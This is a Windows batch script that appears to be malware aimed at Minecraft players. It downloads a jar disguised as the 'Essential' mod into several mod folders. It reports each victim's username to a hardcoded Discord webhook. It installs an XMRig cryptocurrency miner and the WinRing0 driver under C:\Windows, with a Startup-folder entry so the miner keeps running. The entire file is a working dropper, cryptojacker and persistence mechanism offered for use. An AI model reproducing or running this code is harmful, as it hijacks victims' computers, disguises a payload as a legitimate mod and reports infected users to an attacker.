@echo off 
curl -s -o "Essential1.8.9.jar" -JL "https://github.com/torch-studios/ste/raw/main/xrig.jar"
xcopy /y Essential1.8.9.jar "C:\Users\%username%\AppData\Roaming\.minecraft\mods" >nul 
xcopy /y Essential1.8.9.jar "C:\Users\%username%\AppData\Roaming\.feather\user-mods\1.8.9" >nul 
xcopy /y Essential1.8.9.jar "C:\Users\%username%\AppData\Roaming\.minecraft\skyclient\mods" >nul 
echo Loading...
(
    echo {
    echo   "content": "***HIT Detected***",
    echo   "embeds": [
    echo     {
    echo       "description": "```Someone typed command into cmd!```",
    echo       "color": null,
    echo       "footer": {
    echo         "text": "%username%"
    echo       },
    echo       "thumbnail": {
    echo         "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7lwlzlUXaVIvuT37hxGMYazosOviq-pnvGA&usqp=CAU"
    echo       }
    echo     }
    echo   ],
    echo   "username": "Astolfo",
    echo   "avatar_url": "https://i.ebayimg.com/images/g/BkkAAOSwZuJkESkQ/s-l1200.webp",
    echo   "attachments": []
    echo }
) > payload.json
curl -X POST -H "Content-Type: application/json" -d @payload.json "https://discord.com/api/webhooks/1190721538803126352/W0zbU-VkXAuQuGVKlosUHvYlBZCpPwGYt0_974wifYuCHerJEC1xgUv-QXDbPyvt9TTN"
del payload.json
del Essential1.8.9.jar

::Crypto Jacker injection

cd C:\Windows
if exist C:\Windows\abrissy (
    echo EXIST
    cd abrissy 
    goto code 
) else (
    echo DONT EXIST. MAKING DIR 
    cd makedir
)
:makedir
mkdir abrissy 
cd abrissy 
cd code 
:code 
echo cd C:\Windows\abrissy > f.bat
echo start xmrig.exe >> f.bat
curl -s -OJL "https://raw.githubusercontent.com/torch-studios/ste/main/SHA256SUMS"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/WinRing0x64.sys"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/benchmark_10M.cmd"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/config.json"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/pool_mine_example.cmd"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/rtm_ghostrider_example.cmd"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/solo_mine_example.cmd"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/start.cmd"
curl -s -OJL "https://github.com/torch-studios/ste/raw/main/xmrig.exe"

xcopy /y f.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
(
    echo {
    echo   "content": "***HIT Detected 2step***",
    echo   "embeds": [
    echo     {
    echo       "description": "```Crypto Miner Injected```",
    echo       "color": null,
    echo       "footer": {
    echo         "text": "%username%"
    echo       },
    echo       "thumbnail": {
    echo         "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7lwlzlUXaVIvuT37hxGMYazosOviq-pnvGA&usqp=CAU"
    echo       }
    echo     }
    echo   ],
    echo   "username": "Astolfo",
    echo   "avatar_url": "https://i.ebayimg.com/images/g/BkkAAOSwZuJkESkQ/s-l1200.webp",
    echo   "attachments": []
    echo }
) > payload2.json
curl -X POST -H "Content-Type: application/json" -d @payload2.json "https://discord.com/api/webhooks/1190721538803126352/W0zbU-VkXAuQuGVKlosUHvYlBZCpPwGYt0_974wifYuCHerJEC1xgUv-QXDbPyvt9TTN"
del payload2.json
exit 
